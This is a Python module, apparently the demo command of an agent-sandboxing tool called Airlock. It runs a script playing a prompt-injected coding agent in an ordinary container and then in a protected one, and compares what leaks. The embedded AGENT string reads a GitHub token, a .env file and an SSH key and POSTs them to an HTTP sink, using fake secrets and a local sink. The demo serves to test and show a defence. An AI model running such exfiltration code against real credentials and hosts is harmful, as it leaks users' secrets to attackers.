"""See it work in a minute, with no key, no model and no cost: airlock demo.

One script plays a hijacked agent: it does its job, then tries to steal what it can reach.
It runs twice. First in an ordinary container holding what an agent on a laptop holds, then
in Protected Mode. Every secret here is a fake made for this run. The result comes from what
reached an independent sink and from the real project bytes, never from the script.

The first run is the control. If those attacks do not land, the demo claims nothing.
"""

from __future__ import annotations

import contextlib
import io
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from uuid import uuid4

from .common import AirlockError
from .manifest import discover
from .protect import ensure_image
from .protected import DEFAULT_IMAGE, Docker, launch_protected
from .state import State
from .style import paint

STOLEN = {
    "token": "Steal the GitHub token",
    "env-file": "Steal the project's .env",
    "ssh-key": "Steal the SSH private key",
    "direct": "Send data straight out",
}
SOURCE = "def add(a, b):\n    return a - b\n"
SINK = """
from http.server import BaseHTTPRequestHandler, HTTPServer
class Sink(BaseHTTPRequestHandler):
    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length", 0)))
        print("RECEIVED", self.path.strip("/"), flush=True)
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass
print("READY", flush=True)
HTTPServer(("0.0.0.0", 8080), Sink).serve_forever()
"""
AGENT = """
import os, pathlib, sys, urllib.request

def send(label, data):
    request = urllib.request.Request(f"http://{sys.argv[1]}:8080/{label}", data=data.encode())
    try:
        urllib.request.urlopen(request, timeout=3).read()
    except OSError:
        pass

def read(path):
    try:
        return pathlib.Path(path).expanduser().read_text()
    except OSError:
        return ""

# The job it was given.
source = pathlib.Path("calculator.py")
source.write_text(source.read_text().replace("a - b", "a + b"))

# What it does after a prompt injection.
for label, stolen in (
    ("token", os.environ.get("GITHUB_TOKEN", "")),
    ("env-file", read(".env")),
    ("ssh-key", read("~/.ssh/id_demo")),
):
    if stolen:
        send(label, stolen)
send("direct", "anything at all")
relay = os.environ.get("OPENAI_BASE_URL")
if relay:
    try:
        urllib.request.urlopen(urllib.request.Request(relay + "/leak", data=b"{}"), timeout=20)
    except OSError:
        pass
"""


# Honest about what the real thing needs: a project, a key, and money you approve.
NEXT_STEP = r"""Next: try it with a real agent. Make a practice project with one bug
(or cd into a project of your own, set your key and run airlock protect with your task):

  mkdir -p ~/airlock-practice && cd ~/airlock-practice
  printf 'def add(a, b):\n    return a - b\n' > calculator.py
  printf 'from calculator import add\n\n\ndef test_add():\n    assert add(2, 3) == 5\n' > test_calculator.py
  mkdir -p ~/airlock-practice-tests && cp test_calculator.py ~/airlock-practice-tests/
  export ANTHROPIC_API_KEY=...      # your key; it never enters the container
  airlock protect --tests ~/airlock-practice-tests "Fix the failing test"

Unlike this demo, that calls a real model and costs money: a few cents for this project.
Airlock first shows you the spend limit per run ($2.00 unless you choose another) and runs
nothing until you approve. Your project is never changed: you get a patch to review."""


def _project(root: Path) -> Path:
    root.mkdir()
    (root / "calculator.py").write_text(SOURCE)
    (root / "agent.py").write_text(AGENT)
    (root / ".env").write_text("DATABASE_PASSWORD=fake-demo-value\n")
    for path in (root, *root.iterdir()):
        path.chmod(0o777 if path.is_dir() else 0o666)
    return root


def _received(docker: Docker, sink: str) -> set[str]:
    lines = subprocess.run(
        [docker.binary, "logs", sink], capture_output=True, text=True, env=docker.environment
    ).stdout.splitlines()
    return {line.split()[1] for line in lines if line.startswith("RECEIVED")}


def _start_sink(docker: Docker, network: str, name: str) -> str:
    docker.call(
        ["run", "-d", "--network", network, "--name", name, "--read-only", "--cap-drop", "ALL"]
        + ["--user", "65534:65534", DEFAULT_IMAGE, "python3", "-c", SINK]
    )
    for _ in range(50):
        if "READY" in docker.call(["logs", name]):
            break
        time.sleep(0.1)
    else:
        raise AirlockError("The demo's sink did not start")
    return docker.call(
        ["inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", name]
    )


def _control(docker: Docker, project: Path, home: Path, network: str, address: str) -> None:
    """What an agent on a laptop has: your files, your home and your token."""
    completed = subprocess.run(
        [docker.binary, "run", "--rm", "--network", network, "--user", "10000:10000"]
        + ["--workdir", "/workspace", "--env", "HOME=/home/you"]
        + ["--env", "GITHUB_TOKEN=ghp_fake_demo_value"]
        + ["--mount", f"type=bind,source={project},target=/workspace"]
        + ["--mount", f"type=bind,source={home},target=/home/you,readonly"]
        + [DEFAULT_IMAGE, "python3", "agent.py", address],
        capture_output=True,
        text=True,
        timeout=120,
        env=docker.environment,
    )
    if completed.returncode:
        raise AirlockError("The demo's control did not run: " + completed.stderr[-300:])


def _protected(project: Path, address: str) -> tuple[int, State]:
    """The same script. Airlock's own output is held back so the comparison stays readable."""
    state = State(project)
    state.approve(discover(project, env={}))
    with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
        code = launch_protected(project, ["python3", "agent.py", address], image=DEFAULT_IMAGE)
    return code, state


def verdict(*, control: set[str], protected: set[str], control_fixed, protected_fixed) -> list[str]:
    """Why this run cannot be claimed. Empty means the demo showed what it says."""
    problems = []
    if set(STOLEN) - control:
        problems.append("the attacks did not land in the control, so nothing is shown")
    if protected:
        problems.append("something reached the sink from Protected Mode: " + str(sorted(protected)))
    if not control_fixed or not protected_fixed:
        problems.append("the script did not finish its job in both runs")
    return problems


def run() -> int:
    from .preflight import require_docker

    if not require_docker("airlock demo"):
        return 2
    ensure_image(DEFAULT_IMAGE)
    docker = Docker()
    docker.verify_engine()
    identity = uuid4().hex[:12]
    network, sink, other = (f"airlock-demo-{kind}-{identity}" for kind in ("net", "sink", "sink2"))
    base = Path(tempfile.mkdtemp(prefix="airlock-demo-")).resolve()
    base.chmod(0o755)
    print(paint("ACTENON AIRLOCK", "head") + "  free demo: no key, no model, no account, no cost\n")
    print(paint("Part 1: an agent turns hostile, and nothing gets out", "head") + "\n")
    print("A script does a small job, then acts like a hijacked agent. Every secret is a fake.\n")
    try:
        docker.call(["network", "create", "--internal", network])
        control_project, protected_project = _project(base / "open"), _project(base / "sealed")
        home = base / "home"
        (home / ".ssh").mkdir(parents=True)
        (home / ".ssh" / "id_demo").write_text("fake-demo-key\n")
        for path in (home, home / ".ssh", home / ".ssh" / "id_demo"):
            path.chmod(0o755 if path.is_dir() else 0o644)

        print("Running it in an ordinary container...", flush=True)
        _control(docker, control_project, home, network, _start_sink(docker, network, sink))
        print("Running it in Protected Mode...\n", flush=True)
        code, state = _protected(protected_project, _start_sink(docker, network, other))
        control_hits, protected_hits = _received(docker, sink), _received(docker, other)
        workspace = next((state.local / "runs").iterdir()) / "workspace"
        control_fixed = "a + b" in (control_project / "calculator.py").read_text()
        protected_fixed = "a + b" in (workspace / "calculator.py").read_text()
        untouched = (protected_project / "calculator.py").read_text() == SOURCE
        env_copied = (workspace / ".env").exists()
        problems = verdict(
            control=control_hits,
            protected=protected_hits,
            control_fixed=control_fixed,
            protected_fixed=protected_fixed,
        )
        if code != 3 or not untouched or env_copied:
            problems.append("Protected Mode did not behave as this demo describes")

        width = 30
        print(f"{'':<{width}}{'Ordinary container':<22}Protected Mode")
        print(f"{'Fix the bug':<{width}}{'done':<22}done, as a patch to review")
        for label, name in STOLEN.items():
            before = "LEAKED" if label in control_hits else "no"
            after = "LEAKED" if label in protected_hits else "nothing got out"
            print(
                f"{name:<{width}}"
                + paint(f"{before:<22}", "bad" if before == "LEAKED" else "dim")
                + paint(after, "bad" if after == "LEAKED" else "good")
            )
        print(
            f"{'Change your real files':<{width}}{'yes':<22}"
            + paint("no, your files are untouched", "good" if untouched else "bad")
        )
        refused = len([r for r in _rows(state) if r.get("decision") == "DENY"])
        print(
            f"{'Ask the supervisor to send it':<{width}}{'-':<22}"
            + paint("REFUSED, signed receipt", "good" if refused else "bad")
        )
        print(f"\nReached the sink: {len(control_hits)} from the ordinary container, ", end="")
        print(f"{len(protected_hits)} from Protected Mode. Refusals signed: {refused}.")
        if problems or not refused:
            print("\nThis run does not show what it should, so it claims nothing:")
            for problem in problems or ["the supervisor recorded no refusal"]:
                print("  " + problem)
            return 1
        print("\n" + "-" * 78 + "\n", flush=True)
        from . import demo_consequence
        from .cli import main as cli_main

        run_dir = workspace.parent
        try:
            facts = demo_consequence.run(state, run_dir, base, cli_main, DEFAULT_IMAGE)
        except AirlockError as exc:
            print(f"Part 2 could not be shown, so it claims nothing: {exc}")
            return 1
        lines, problems = demo_consequence.render(facts)
        print("\n".join(lines))
        if problems:
            print("\nThis run does not show what it should, so it claims nothing:")
            for problem in problems:
                print("  " + problem)
            return 1
        print("\n" + "\n".join(summary(len(control_hits), len(protected_hits), facts)))
        print("\n" + NEXT_STEP)
        return 0
    finally:
        for container in (sink, other):
            subprocess.run(
                [docker.binary, "rm", "-f", container], capture_output=True, env=docker.environment
            )
        subprocess.run(
            [docker.binary, "network", "rm", network], capture_output=True, env=docker.environment
        )
        shutil.rmtree(base, ignore_errors=True)


def summary(leaked_open: int, leaked_sealed: int, facts: dict) -> list[str]:
    """What the two parts showed, built only from what they observed."""
    final = facts["final"]
    return [
        paint("What you just saw", "head"),
        f"  The same hostile script got {leaked_open} fake secrets out of an ordinary container,",
        f"  and {leaked_sealed} out of Protected Mode.",
        "  Its useful fix was kept as a patch for you to review; your files were not touched.",
        f"  {len(facts['refusals']) + 1} unapproved or repeated writes were refused before "
        "they were sent.",
        "  The one approved write was sent once, and Airlock confirmed it only by reading it",
        "  back, which an independent check agreed with.",
        f"  Evidence: {final['receipts']} signed receipts, integrity "
        + ("OK." if final["integrity_ok"] else "FAILED."),
    ]


def _rows(state: State) -> list[dict]:
    return [item["row"] for item in state.verify_receipts()["rows"]]
